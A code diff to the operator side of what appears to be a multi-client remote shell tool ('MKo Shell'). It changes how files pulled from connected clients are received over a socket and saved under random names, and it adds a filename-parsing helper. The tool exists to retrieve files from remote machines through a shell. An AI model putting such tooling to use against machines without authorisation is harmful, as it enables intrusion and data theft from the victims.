@@ -1,4 +1,5 @@
 import os
+import random
 
 import pyfiglet
 
@@ -122,30 +123,37 @@ def print_progress(progress, nbr_of_dot):
 
 
 def download_file(file_path, conn):
-    if '/' in file_path:
-        filename = file_path.split("/")[-1]
-    elif '\\' in file_path:
-        filename = file_path.split("\\")[-1]
+    filename, file_path = format_filename(file_path)
+
+    # check if Download folder exists
+    if not os.path.exists("Downloads"):
+        os.makedirs("Downloads")
+
+    # receive file status => check if file exists and is readable
+    file_status = conn.recv(1024).decode('utf-8')
+    if file_status == "File not found":
+        print("File not found or not readable access.")
+
     else:
-        filename = file_path
+        # receive the file size
+        file_size = int.from_bytes(conn.recv(8), 'big')
+        print(f"Expected file size: {file_size} bytes")
 
-    # receive the file size
-    file_size = int.from_bytes(conn.recv(8), 'big')
-    print(f"Expected file size: {file_size} bytes")
-
-    # receive the file
-    nbr_of_dot = 1
-    with open(filename, "wb") as file:
-        received = 0
-        while received < file_size:
-            chunk = conn.recv(min(1024, file_size - received))
-            if not chunk:
-                raise EOFError('Connection closed before receiving all the data')
-            file.write(chunk)
-            received += len(chunk)
-            # calculate progress
-            progress = str(round(((received / file_size) * 100)))
-            nbr_of_dot = print_progress(progress, nbr_of_dot)
+        # receive the file
+        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + "_"
+        # random_str = random_str + "_"
+        nbr_of_dot = 1
+        with open("Downloads/"+random_str + filename, "wb") as file:
+            received = 0
+            while received < file_size:
+                chunk = conn.recv(min(1024, file_size - received))
+                if not chunk:
+                    raise EOFError('Connection closed before receiving all the data')
+                file.write(chunk)
+                received += len(chunk)
+                # calculate progress
+                progress = str(round(((received / file_size) * 100)))
+                nbr_of_dot = print_progress(progress, nbr_of_dot)
 
 
 def interact_shell(conn, client_id):
@@ -168,3 +176,18 @@ def interact_shell(conn, client_id):
         print(output)
 
         print(f"MKo Shell (client {client_id}) > ", end="")
+
+
+def format_filename(commande):
+    try:
+        file_path = commande.split(" ", 1)[1]
+    except IndexError:
+        file_path = commande
+
+    file_path = file_path.replace('"', '')
+    if '/' in file_path:
+        return file_path.split("/")[-1], file_path
+    elif '\\' in file_path:
+        return file_path.split("\\")[-1], file_path
+    else:
+        return file_path, file_path
